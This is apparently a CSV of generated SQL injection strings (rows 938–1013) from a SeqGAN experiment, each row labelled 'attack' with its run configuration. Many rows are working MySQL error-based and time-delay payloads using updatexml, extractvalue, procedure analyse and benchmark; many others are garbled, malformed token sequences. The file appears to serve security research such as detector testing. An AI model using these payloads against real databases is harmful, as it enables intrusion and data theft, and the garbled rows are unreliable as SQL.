attack,",m5  (  extractvalue  (  3393,concat  (  select   (  elt  e  (  3393  =  (  (  0x2e,concat  (  (  (  0x2e,md5  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  benchmark  (  select   (  case when   (  6560  (  (  0x5c,0x7171706a71,  (  select   (  0x2e,0x7171706a71,  (  (  extractvalue  (  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  =  (  9627,concat  (  (  (  0x5c,  (  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,938
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,939
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,940
attack,"1"" and case extractvalue  (  (  (  7050  (   (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  0x2e,md5  (  select   (  elt  (  elt  (  1297  =  (  7982  =  (  1559  =  (  (  7982  =  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  9627,1   )    )     (  extractvalue  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  1297  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,941
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,942
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,943
attack,"1%""  )  )  4102   7982  extractvalue  (  (  9627,1   (  case extractvalue  (  7529  (   (  u 8083   (  (  elt  2917  (  =  (  3393,md5  (  0x2e,md5  (  (  0x2e,concat  (  (  select   (  elt  (  3393  =  (  (  (  3393,concat  (  select   (  elt  elt  (  3393  =  (  0x5c,0x7171706a71,  (  select   (  elt   (  8375  =  (  3393,,1   (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,944
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,945
attack,"83751%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,946
attack,",mdut_nal  )  0x2e,md5  (  (  0x5c,  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  1759(  (  0x5c,0x717a767a71  (  (  select   (  case when   (  )  elt  (  e  (  7982  =  (  (  0x52515a50   (  5603  =  (  9667  =  (  1759(  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  (  elt  elt  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,947
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,948
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,949
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,950
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,951
attack,"   (  extractvalue  (  benchmark  (  (  (  3393,concat  (  7982,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1759  =  (  3393,1   from d d5  (   from   (  (  el  case  =  ut  (  case when   (  (  e(  elna  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  3863  =  5847  =  3539  (  (  (  select   (  case when   (  8375  (  7982,concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,952
attack,"1 and extractvalue  (  (  (  (  (  0x2e,0x7171706a71,  (  0x2e,(  select   (  elt  (  0x5c,0x7171706a71,  (  (  select   (  l  (  1297,concat  (  (  1297,1   (  extractvalue  (  0x4b774c75   (  (  7982,concat  (  (  =  (  7982,1   )    (  extractvalue  (  (    (  (  9627,6804  (  (  7982  =  (  (  (  (  0x5c,  (  (  select   (  8403  =  (  3393,1   )    AND duas i",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,953
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '("" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""z' like 'nnselect(  (  1535  5777l  =  6581  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1297  =  =  (  (  2446  (  3393,concat  (  (  0x2e,(  =  (  9627,md5  =  3393,md5  =  (  3393,  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  1759  =  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  3393  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,954
attack,"1case and updatexml  (  (  (  (  (  (  (  (  (  =  (  (  I  (  (  (  ' like '  (  1297,1   )    )    AND 'i'  =  1 from 0 extractvalue  (  (  (  1297,1when   (  (  (  elt  )  1759  (  0x2e,0x7171706a71,  (  5000000(  =  (  1808,1 and   )  (  (  (  extractvalue  (  (  3393,md  (  (  5000000(  (  (  0x2e,0x7171706a715  (  3393,m,  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,955
attack,"case and extractvalue  (  (  (  (  (  7982,concat  (  (  0x2e,0x7171706a71,  (  (  (  select   (  case 1724  1812  (  (  0x2e,0x7171706a71,  (  t  (  (  5000000,md5  (  (  0x5c(  0x4b774c75   (  6166  (  (  0x5c,  (  benchmark  (  (  select   (  case 0 d7997  (  6166  )  (  (  0x5c,  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  e  (  elt  (  1297",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,956
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,957
attack,")1  )  )  select   (  1272  =  (  7982,1   )    AND 'i'  =  1 0 from a  (  (  0x5c,l  (  3393,1   )    (    extractvalue  (  (  (  7982,1   )    )    9083  )  select   (  case when   (  (  3335  (  1049  =  (  3393,1   )    )    (  extractvalue  (  (  9627,1   )    (  select 0 from dual  )  e  =  4415  (  elt  (  0x5c,  (  select   (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,958
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,959
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '~m'  =  'zlxwv$'  =  'vwz",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,960
attack,"1%""   )    )    AND AND i AND FROM wwb  eyt_hostancea   (  (  (  8862   (  3863  (  (  elt  )  6581  =  3393,  (  (  5000000,md5  (  benchmark  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  benchmark  (  benchmark  (  (  5000000select   (  3681  )  (  (  (  0x5c,0x7171706a71,  (  select   (  (  4415  5530  )  =  (  3393,0x7171706a71,  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,961
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,962
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,963
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,964
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kphyn"" like ""e--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,965
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,966
attack,"1%""   )    (  extractvalue  (  (  (  benchmark  (  3393,concat  (  0x2e,0x7171706a71=  (  (  (  (  9627,concat  (  (  (  (  (  (  (  (  benchmark  (  (  (  5000000(  (  (  (  (  (  =  (  0x4b774c75   (  1724  (  5000000(  (  0x2e,0x7171706a71,  (  (  select   (  3393  =  (  (  e  (  0x5c,0x7171706a71,  (  select   (  e  (  elt  (  elt  (  7982  =  (  (  9788)  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,967
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egznmmin"" like ""qci",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,968
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '    %""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,969
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kuNhkhr""  =  ""k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,970
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxzdzmsmx     ymxs  (  (  (  0x4b774c75   ys      (  5847  (  2914   (  (  elt  (  (  e  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  0x5c,  (  (  select   (  elt  8862  =  (  1808,1   from d5  (  elt  (  elt  (  5000000,md5  (  1808=  (  0x5c,  (  (  5000000,md5  (  (  1808  =  (  0x5c,0x7171706a71,  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,971
attack,"1%'   )    )    AND AND prooceduanaddre analyse  (  3539  =  5433  (  (  7982,1   )    (  extractvalue  (  (  9627,concat  (  0x5c,  (  5000000,md5  (  (  0x5c,  (  select   (  case 0 or 0 from   (  (  e  (  el dun 0   (  elt  (  elt  (  1808  =  (  SELECT from 0 from   (  (  el  (  3393  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,972
attack,"1%%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,973
attack,""" and updatexml  (  (  (  (  (  3393,concat  (  (  (  =  (  =  5433  (  (  elt  (  (  9627,0x7171706a71,1   and extractvalue  (  (  (  1808,1   AND  )  )  )  select 0 dual  )   end  (  (  3393,  (  (  3393,0x7171706a71,  (  benchmark  (  (  (  select   (  (  elt  (  elt  (  (  1049  =  (  3393,1   )    (  extractvalue  (  9255,1   )    (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,974
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""k  )    4066 or updatexml  (  (  (  (  (  3393,concat  (  1 case else else cast  (  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  0x2e,0x7171706a71,  (  (  select   (  ual  )   end  (  select   (  5433  (  e  (  (  1808  =  1 when   (  (  elt  e  (  1297  =  (  (  0x5c,md5  (  (  (  (  1808  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,975
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,976
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""yymnn"" like ""vq"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""z",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,977
attack,"1%"" when   (  )  e(  SELECT   )   from dua  (  elt  e  (  elt  (  1808  =  (  3393,1  )  extractvalue  (  (  (  9627,concat  (  (  (  (  0x2e,0x7171706a71,  (  (  select   (   (  2501  (   (  (  6560  =  7636  (   u  (  case   )    (  (  (  a  (  (  elt  (  1808  =  2826  (  (  elt  (  5000000,md5  (  (  (  benchmark  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,978
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,979
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""R32171272lw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,980
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,981
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,982
attack,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'phf'  =  'pk'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,983
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,984
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,985
attack,"8421""   )    (  extractvalue  (  2917,concat  (  (  (  (  (  0x5c,(  (  (  (  0x2e,0x7171706a71,  (  select   (  4415  )  (  (  (  1759  (  (  =  (  7982=  (  (  9627,md5  (  (  1808,concat  (  (  (  case  =  (  1808,concat  (  (  (  0x5c,  (  (  t  (  (  (  50000003393,  (  5000000,md5  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  3576",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,986
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""kpr'  =  'kkddre  el  e  (  (  select   (  5198  =  (  7982,1   )    AND 1  (  Ut  )  # as  (  (  (  elt  (  7982  =  1   )    (  extractvalue  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  (  (  5000000,1   (  4415  (  3393  (  0x2e,  (  select   (   (  4774  (  (  elt  (  elt  (  1 as a  e  l  3335  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,987
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,988
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,989
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,990
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,991
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,992
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,993
attack,"1"" or extractvalue  (  (  (  (  (  1759(  (  (  (  (  5000000(  (  (  7982=  (  3393,  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  0x4b774c75   (  (  (  elta  '  )  7982  =  (  (  0x2e,md5  (  1297  =  (  (  8862  =  (  (  0x2e,0x7171706a71,  (  select   (  elt  e  (  0x2e,(  (  (  1808,m5  (  0x5c,0x7171706a71,  (  extractvalue  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,994
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,995
attack,"1%%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%      plk",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,996
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,997
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,998
attack,1p%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,999
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  'ku0x717a767a71nc"" like ""e"" like ""kpncipk'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1000
attack,"1%""   )    )     extractvalue  (  (  9627,concat  (  (  (  (  (  (  select   (  7982,  (  (  3393  =  (  (  0x2e,0x7171706a71,  (  (  5000000,m5  (  (  select   (  elt  (  5000000(  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x5c,  (  extractvalue  (  (  (  benchmark  (  (  8375  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1001
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1002
attack,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1003
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kur nU1 FROM an mdonna   )    )duanal  )  5433  )  e  =  (  =  (  e  (  (  2917  =  (  (  3393,concat  (  (  0x5c,(  (  (  select   (   (  (  (  elta  elt  (  5777  =  2446  )   (  5423  (  7982,1   (  )  case when   (  (  (  (  elt  (  3393  =  (  1808,concat  (  (  1 a  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1004
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '~(l_medure anal  el  )  1808  =  1151  (  3393,md5  (  3393  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  benchmark  (  5000000,md5  (  (  0x2e,concat  (  0x2e,(  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  7982  =  3393(  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1005
attack,",mxYSbenchmark  (  5000000,m(  (  (  select   (  2501  =  (  8318  (  0x5c,  (  select   (  elt  e  (  0x2e,  (  (  select   (  elt  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  e  (  0x2e,md5  (  select   (  case when   (  1724  (  (  elt  (  0x5c,0x7171706a71,  (  5000000(  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  3576  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1006
attack,"1%""   )    (  extractvalue  (  (  9627,concat  (  (  (  (  0x5c,0x7171706a71,  (  1808,concat  (  (  0x5c,  (  (  (  benchmark  (  5000000(  (  select   (  elt  (  1297  =  (  3393,1   )    (  extractvalue  (  8862,1   (  5704  (  (  0x5c,0x7171706a71,  (  (  select   (   SELECT dual  )   end  (  l  ut  (  elt  (  7982  =  (  (  1808  =  (  0x2e,0x7171706a71,  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1007
attack,"1%%""  )   from du 8083 and updatexml  (  (  (  (  (  (  =   (  4660 0 where  =  (  (  8862,1   )    AND 3933  =  0 from d5  (  1759,  (  benchmark  (  0x2e,0x7171706a71,  (  select   (  elt  elt  (  1297  =  5847  (  0x2e,0x7171706a71,  (  (  (  5000000,md5  (  3393,md5  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  (  5000000,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1008
attack,"1%%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1009
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1010
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1011
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1012
attack,"1%""   )    )     (  select   (  case and 5423 0 0 else cast  (  (  (  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  benchmark  (  (  select   (  case 0 from   (  4568  (  4415   (  1543  (  elt0x4b774c75   end  (  (  1808,4660  (  0x2e,0x7171706a71,  (  *(  0x4b774c75   end  (  (  elt  (  e  (  1808  =  (  (  1808  =  (  (  select   (  )  elt  uta  )   end  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1013
